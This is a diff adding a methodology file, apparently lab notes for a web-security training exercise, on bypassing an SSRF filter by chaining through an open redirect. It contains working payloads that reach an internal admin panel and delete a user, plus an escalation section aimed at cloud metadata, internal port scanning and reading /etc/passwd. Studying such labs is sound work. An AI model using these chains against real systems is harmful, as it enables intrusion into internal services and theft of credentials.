@@ -1,0 +1,138 @@
+# ============================================================
+# METHODOLOGY — SSRF with Filter Bypass via Open Redirection
+# How to find and chain these two vulnerabilities
+# ============================================================
+
+
+## PHASE 1 — IDENTIFY THE SSRF ENTRY POINT
+
+1. Browse the application normally with Burp proxy active
+2. Find the stock check feature on any product page
+3. Click "Check stock" — intercept the POST request
+4. Identify the stockApi parameter in the POST body
+5. Send to Repeater for controlled testing
+6. Try: stockApi=http://127.0.0.1/ → observe the response
+
+If blocked: filter is active — proceed to Phase 2
+If not blocked: basic SSRF, try admin panel directly
+
+
+## PHASE 2 — FINGERPRINT THE SSRF FILTER
+
+Goal: understand exactly what the filter allows and blocks.
+
+Test 1 — Does it block external IPs?
+  stockApi=http://192.168.0.12:8080/admin
+  → 400/500 = yes, blocked
+
+Test 2 — Does it allow local paths?
+  stockApi=/product?productId=1
+  → 200 = yes, local paths allowed
+
+Test 3 — Does it allow the app's own domain?
+  stockApi=https://YOUR-LAB.web-security-academy.net/product?productId=1
+  → 200 = yes, own domain allowed
+
+After phase 2, you know:
+  - Local relative paths (/...) are ALLOWED
+  - External IPs are BLOCKED
+  - The filter is a local-only allowlist
+
+
+## PHASE 3 — HUNT FOR OPEN REDIRECTS ON ALLOWED DESTINATIONS
+
+Since local paths are allowed, find any redirect within the application.
+
+Where to look for open redirects:
+  - Navigation links (next/prev product, category links)
+  - Login/logout redirect parameters
+  - OAuth callback parameters
+  - "Return to" or "continue" links after actions
+  - Any link that takes a URL/path as a parameter
+
+How to test each candidate:
+  - Intercept the request
+  - Find the parameter that looks like a path or URL
+  - Change it to http://evil.com
+  - If response is 302 Location: http://evil.com → open redirect found
+
+In this lab:
+  1. Click "Next product" on any product page
+  2. Intercept: GET /product/nextProduct?path=/product?productId=2
+  3. Response: 302 Location: /product?productId=2
+  4. Change path to http://evil.com
+  5. Response: 302 Location: http://evil.com
+  6. Open redirect confirmed on /product/nextProduct
+
+
+## PHASE 4 — BUILD THE SSRF CHAIN
+
+With both vulnerabilities confirmed:
+
+Structure:
+  stockApi = [open-redirect-path]?[redirect-param]=[internal-target]
+
+For this lab:
+  stockApi = /product/nextProduct?path=http://192.168.0.12:8080/admin
+
+Test the chain:
+  1. Does the filter pass it? (local path → yes)
+  2. Does the server follow the redirect? (check response content)
+  3. Is admin panel HTML in the response? (200 + admin HTML = yes)
+
+
+## PHASE 5 — EXECUTE THE GOAL
+
+Admin panel confirmed. Find the delete action.
+Read the admin HTML for the delete endpoint path.
+
+Build the delete payload:
+  stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+Send. Expect HTTP 302 from the admin delete action.
+Lab solved.
+
+
+## PHASE 6 — ESCALATE (real engagement mindset)
+
+Once open redirect + SSRF chain is confirmed:
+  - Try cloud metadata:
+    /product/nextProduct?path=http://169.254.169.254/latest/meta-data/
+  - Port scan internal network:
+    /product/nextProduct?path=http://192.168.0.X:PORT/
+  - Try other internal IPs:
+    /product/nextProduct?path=http://10.0.0.1/
+  - Try filesystem (if server supports file://):
+    /product/nextProduct?path=file:///etc/passwd
+
+
+## HOW TO FIND OPEN REDIRECTS SYSTEMATICALLY
+
+In Burp Suite — Passive scan:
+  Burp Scanner flags open redirects automatically if enabled.
+  Look for "Open redirection" findings in Scanner results.
+
+Manual approach:
+  1. Spider the application (crawl all links)
+  2. Look for parameters containing: path, url, redirect, to, next,
+     return, continue, goto, dest, destination, forward, location
+  3. For each: test with http://evil.com
+  4. If 302 Location: http://evil.com → open redirect found
+
+The open redirect does not have to be obvious.
+It can be in:
+  - Error pages ("go back" link)
+  - Post-login redirects
+  - Post-logout redirects
+  - API endpoints that return redirect URLs
+  - OAuth state parameters
+
+
+## KEY MINDSET
+
+When SSRF has a whitelist filter, do not just try encoding tricks.
+Ask: "Is there an open redirect anywhere on the allowed destinations?"
+
+One open redirect on any allowed domain = the entire whitelist fails.
+The redirect is the bridge between the trusted domain and the internal target.
+The filter only checks one side of the bridge.
